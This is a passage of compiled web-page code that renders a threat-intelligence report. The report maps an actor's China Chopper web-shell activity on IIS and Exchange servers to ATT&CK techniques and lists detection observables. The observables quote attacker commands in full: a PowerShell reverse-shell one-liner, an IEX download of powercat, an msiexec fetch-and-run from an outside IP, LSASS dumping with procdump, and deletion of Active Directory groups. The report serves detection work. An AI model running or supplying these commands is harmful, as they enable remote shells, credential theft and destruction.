",(0,l.kt)("inlineCode",{parentName:"td"},"msiexec /q /i http://103[.]212.223.210:9900/nvidia.msi")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1505.003",(0,l.kt)("br",null),"T1059.003",(0,l.kt)("br",null),"T1070.004"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"CMD del commands via China Chopper Web Shell")," to delete Web Shell files for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d C:/inetpub/wwwroot/aspnet_client&del 'E:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\OutlookEN.aspx'&echo [S]"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d C:/inetpub/wwwroot/aspnet_client&del 'E:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\TimeoutLogout.aspx'&echo [S]"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"del 'E:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\OutlookEN.aspx"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"del 'E:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\TimeoutLogout.aspx")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Impact"),(0,l.kt)("td",{parentName:"tr",align:null},"T1505.003",(0,l.kt)("br",null),"T1059.003",(0,l.kt)("br",null),"T1531"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"net group del commands via China Chopper Web Shell")," to deleted Active Directory groups for Impact."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'cmd /c cd /d C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\system_web&net group "Exchange Organization administrators" administrator /del /domain&echo [S]&cd&echo [E]'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net group \\"Exchange Organization administrators\\" administrator /del /domain')),(0,l.kt)("td",{parentName:"tr",align:null})))),(0,l.kt)("h2",{id:"ttp-profiles-with-observables"},"TTP Profiles with Observables"),(0,l.kt)("h3",{id:"threat-actor-used-exploits-against-internet-information-services-iis-and-microsoft-exchange-server-to-install-china-chopper-web-shells-for-persistence"},"Threat actor used exploits against ",(0,l.kt)("em",{parentName:"h3"},"Internet Information Services (IIS)")," and ",(0,l.kt)("em",{parentName:"h3"},"Microsoft Exchange Server")," to install ",(0,l.kt)("em",{parentName:"h3"},"China Chopper Web Shells")," for Persistence."),(0,l.kt)("h4",{id:"tactic"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Persistence")),(0,l.kt)("h4",{id:"techniques"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1505.003 - Server Software Component: Web Shell"),(0,l.kt)("li",{parentName:"ul"},"T1190 - Exploit Public-Facing Application")),(0,l.kt)("h4",{id:"behaviors-and-observables"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1505.003",(0,l.kt)("br",null),"T1190"),(0,l.kt)("td",{parentName:"tr",align:null},"Internet Information Services (IIS) Worker Process -",(0,l.kt)("em",{parentName:"td"},"w3wp.exe"),"- drops Web Shells to IIS aspnet_client folder."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1505.003",(0,l.kt)("br",null),"T1190"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"w3wp.exe")," drops files into IIS system_web folder."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\system_web\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\system_web\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\system_web\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\system_web\\\\"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1505.003",(0,l.kt)("br",null),"T1190"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"w3wp.exe")," drops files into  ",(0,l.kt)("em",{parentName:"td"},"Microsoft Exchange Server ecp auth")," folder."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Program Files\\\\Microsoft\\\\Exchange Server\\\\V15\\\\FrontEnd\\\\HttpProxy\\\\ecp\\\\auth\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Program Files\\\\Microsoft\\\\Exchange Server\\\\V15\\\\FrontEnd\\\\HttpProxy\\\\ecp\\\\auth\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Program Files\\\\Microsoft\\\\Exchange Server\\\\V15\\\\FrontEnd\\\\HttpProxy\\\\ecp\\\\auth\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Program Files\\\\Microsoft\\\\Exchange Server\\\\V15\\\\FrontEnd\\\\HttpProxy\\\\ecp\\\\auth\\\\"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1505.003",(0,l.kt)("br",null),"T1190"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"w3wp.exe")," drops files into ",(0,l.kt)("em",{parentName:"td"},"Microsoft Exchange Server owa auth")," folder."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Program Files\\\\Microsoft\\\\Exchange Server\\\\V15\\\\HttpProxy\\\\owa\\\\auth\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Program Files\\\\Microsoft\\\\Exchange Server\\\\V15\\\\HttpProxy\\\\owa\\\\auth\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Program Files\\\\Microsoft\\\\Exchange Server\\\\V15\\\\HttpProxy\\\\owa\\\\auth\\\\"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1505.003",(0,l.kt)("br",null),"T1190"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"w3wp.exe"),"  drops files into ",(0,l.kt)("em",{parentName:"td"},"Microsoft Exchange Server FrontEnd owa auth")," folder."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Exchange\\\\FrontEnd\\\\HttpProxy\\\\owa\\\\auth\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Exchange\\\\FrontEnd\\\\HttpProxy\\\\owa\\\\auth\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Exchange\\\\FrontEnd\\\\HttpProxy\\\\owa\\\\auth\\\\"))))),(0,l.kt)("h4",{id:"notes"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"If execution is on an x86 architecture, the process will be ",(0,l.kt)("em",{parentName:"li"},"C:","\\","Windows","\\","SysWOW64","\\","inetsrv","\\","w3wp.exe"),"."),(0,l.kt)("li",{parentName:"ul"},"Common file types for web shells are ",(0,l.kt)("em",{parentName:"li"},".aspx"),", ",(0,l.kt)("em",{parentName:"li"},".asp")," and ",(0,l.kt)("em",{parentName:"li"},".js"),".")),(0,l.kt)("h3",{id:"threat-actor-used-nltest-net-and-other-basic-commands-via-china-chopper-web-shell-for-discovery"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"nltest, net and other basic commands via China Chopper Web Shell")," for Discovery."),(0,l.kt)("h4",{id:"tactic-1"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Discovery")),(0,l.kt)("h4",{id:"techniques-1"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1505.003 - Server Software Component: Web Shell"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("li",{parentName:"ul"},"T1049 - System Network Connections Discovery"),(0,l.kt)("li",{parentName:"ul"},"T1082 - System Information Discovery"),(0,l.kt)("li",{parentName:"ul"},"T1069 - Permission Groups Discovery: Domain Groups"),(0,l.kt)("li",{parentName:"ul"},"T1482 - Domain Trust Discovery")),(0,l.kt)("h4",{id:"behaviors-and-observables-1"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1505.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"w3wp")," spawns ",(0,l.kt)("em",{parentName:"td"},"CMD"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"/c cd /d C:\\\\inetpub\\\\wwwroot\\\\&query user&echo [S]&cd&echo [E]"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"/c cd /d C:\\\\inetpub\\\\wwwroot\\\\&hostname&echo [S]&cd&echo [E]"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"/c cd /d C:\\\\inetpub\\\\wwwroot\\\\&ping #{dst} -n 1&echo [S]&cd&echo [E]"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"/c cd /d C:\\\\inetpub\\\\wwwroot\\\\&tasklist\\|findstr dll&echo [S]&cd&echo [E]"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'cd /d "c:\\inetpub\\wwwroot\\"&whoami&echo [S]&cd&echo [E]'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d c:\\\\temp&tasklist&echo [S]&cd&echo [E]"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d E:\\\\logs&tasklist &echo [S]&cd&echo [E]"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003",(0,l.kt)("br",null),"T1049",(0,l.kt)("br",null),"T1082"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," spawns discovery commands (",(0,l.kt)("em",{parentName:"td"},"query.exe"),", ",(0,l.kt)("em",{parentName:"td"},"hostname.exe"),", ",(0,l.kt)("em",{parentName:"td"},"ping.exe"),", ",(0,l.kt)("em",{parentName:"td"},"tasklist.exe"),", ",(0,l.kt)("em",{parentName:"td"},"whoami.exe"),")."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"query user"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"hostname"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"ping #{dst} -n 1"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"tasklist\\|findstr dll"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"whoami"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"tasklist"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003",(0,l.kt)("br",null),"T1069",(0,l.kt)("br",null),"T1482"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," spawns ",(0,l.kt)("em",{parentName:"td"},"nltest.exe")," and ",(0,l.kt)("em",{parentName:"td"},"net.exe")," commands."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"nltest /dclist:#{DOMAIN}"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"whoami"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net group \\"Domain computers\\" /do'))))),(0,l.kt)("h3",{id:"threat-actor-used-wmic-via-china-chopper-web-shell-to-list-running-processes-for-discovery"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"wmic via China Chopper Web Shell")," to list running processes for Discovery."),(0,l.kt)("h4",{id:"tactic-2"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Discovery")),(0,l.kt)("h4",{id:"techniques-2"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1505.003 - Server Software Component: Web Shell"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("li",{parentName:"ul"},"T1047 - Windows Management Instrumentation"),(0,l.kt)("li",{parentName:"ul"},"T1057 - Process Discovery")),(0,l.kt)("h4",{id:"behaviors-and-observables-2"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1505.003",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"w3wp")," spawns ",(0,l.kt)("em",{parentName:"td"},"CMD")," commands for execution of ",(0,l.kt)("em",{parentName:"td"},"WMIC")," commands."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\system_web&wmic process where name=smex_master.exe get ExecutablePath,commandline&echo [S]&cd&echo [E]"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\system_web&wmic process where name=unsecapp.exe get ExecutablePath&echo [S]&cd&echo [E]"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\system_web&wmic process where name=unsecapp.exe get processid&echo [S]&cd&echo [E]"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1047",(0,l.kt)("br",null),"T1059.003",(0,l.kt)("br",null),"T1057"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," spawns ",(0,l.kt)("em",{parentName:"td"},"wmic.exe")," discovery commands."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"wmic process where name=smex_master.exe get ExecutablePath,commandline"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"wmic process where name=unsecapp.exe get ExecutablePath"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"wmic process where name=unsecapp.exe get processid"))))),(0,l.kt)("h3",{id:"threat-actor-used-procdump64-via-china-chopper-web-shell-for-credential-access"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"Procdump64 via China Chopper Web Shell")," for Credential Access."),(0,l.kt)("h4",{id:"tactic-3"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Credential Access")),(0,l.kt)("h4",{id:"techniques-3"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1505.003 - Server Software Component: Web Shell"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("li",{parentName:"ul"},"T1003.001 - OS Credential Dumping: LSASS Memory")),(0,l.kt)("h4",{id:"behaviors-and-observables-3"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1505.003",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"w3wp")," spawns ",(0,l.kt)("em",{parentName:"td"},"CMD")," to execute ",(0,l.kt)("em",{parentName:"td"},"Procdump64"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d C:\\\\root&procdump64.exe -accepteula -ma lsass.exe lsass.dmp&echo [S]&cd&echo [E]"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d E:\\\\logs&procdump64.exe -accepteula -ma lsass.exe lsass.dmp&echo [S]&cd&echo [E]"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1003.001",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," spawns ",(0,l.kt)("em",{parentName:"td"},"Procdump64")),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"procdump64.exe -accepteula -ma lsass.exe lsass.dmp"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"procdump64.exe -accepteula -ma lsass.exe lsass.dmp"))))),(0,l.kt)("h3",{id:"threat-actor-used-powershell-to-stablish-additional-c2-channels-for-command-and-control"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"PowerShell")," to stablish additional C2 channels for Command And Control."),(0,l.kt)("h4",{id:"tactic-4"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Command And Control")),(0,l.kt)("h4",{id:"techniques-4"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1059.001 - Command and Scripting Interpreter: PowerShell"),(0,l.kt)("li",{parentName:"ul"},"T1505.003 - Server Software Component: Web Shell"),(0,l.kt)("li",{parentName:"ul"},"T1095 - Non-Application Layer Protocol"),(0,l.kt)("li",{parentName:"ul"},"T1071.001 - Application Layer Protocol: Web Protocols")),(0,l.kt)("h4",{id:"behaviors-and-observables-4"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.001",(0,l.kt)("br",null),"T1505.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"w3wp")," spawns ",(0,l.kt)("em",{parentName:"td"},"PowerShell")),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(IP, PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \\| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"IEX (New-Object System.Net.Webclient).DownloadString('https://raw[.]githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c REDACTED -p REDACTED -e powershell"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.001",(0,l.kt)("br",null),"T1095"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"PowerShell")," executes Nishang Invoke-PowerShellTcpOneLine reverse shell."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(IP, PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \\| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.001",(0,l.kt)("br",null),"T1071.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Attempted to download and execute PowerCat to connect to a remote server"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"IEX (New-Object System.Net.Webclient).DownloadString('https://raw[.]githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c REDACTED -p REDACTED -e powershell"))))),(0,l.kt)("h3",{id:"threat-actor-used-msiexec-via-china-chopper-web-shell-to-execute-web-payload-for-command-and-control"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"MSIEXEC via China Chopper Web Shell")," to execute web payload for Command And Control."),(0,l.kt)("h4",{id:"tactic-5"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Command And Control")),(0,l.kt)("h4",{id:"techniques-5"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1505.003 - Server Software Component: Web Shell"),(0,l.kt)("li",{parentName:"ul"},"T1218.007 - Signed Binary Proxy Execution: Msiexec"),(0,l.kt)("li",{parentName:"ul"},"T1071.001 - Application Layer Protocol: Web Protocols"),(0,l.kt)("li",{parentName:"ul"},"T1105 - Ingress Tool Transfer")),(0,l.kt)("h4",{id:"behaviors-and-observables-5"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1505.003",(0,l.kt)("br",null),"T1218.007"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"w3wp")," spawns ",(0,l.kt)("em",{parentName:"td"},"MSIEXEC")),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d C:\\\\inetpub\\\\wwwroot\\\\aspnet_client&msiexec /q /i http://103[.]212.223.210:9900/nvidia.msi&echo [S]&cd&echo [E]"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001",(0,l.kt)("br",null),"T1105",(0,l.kt)("br",null),"T1218.007"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"MSIEXEC")," fetches and executes web payload."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"msiexec /q /i http://103[.]212.223.210:9900/nvidia.msi"))))),(0,l.kt)("h3",{id:"threat-actor-used-cmd-del-commands-via-china-chopper-web-shell-to-delete-web-shell-files-for-defense-evasion"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"CMD del commands via China Chopper Web Shell")," to delete Web Shell files for Defense Evasion."),(0,l.kt)("h4",{id:"tactic-6"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Defense Evasion")),(0,l.kt)("h4",{id:"techniques-6"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1505.003 - Server Software Component: Web Shell"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("li",{parentName:"ul"},"T1070.004 - Indicator Removal on Host: File Deletion")),(0,l.kt)("h4",{id:"behaviors-and-observables-6"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech 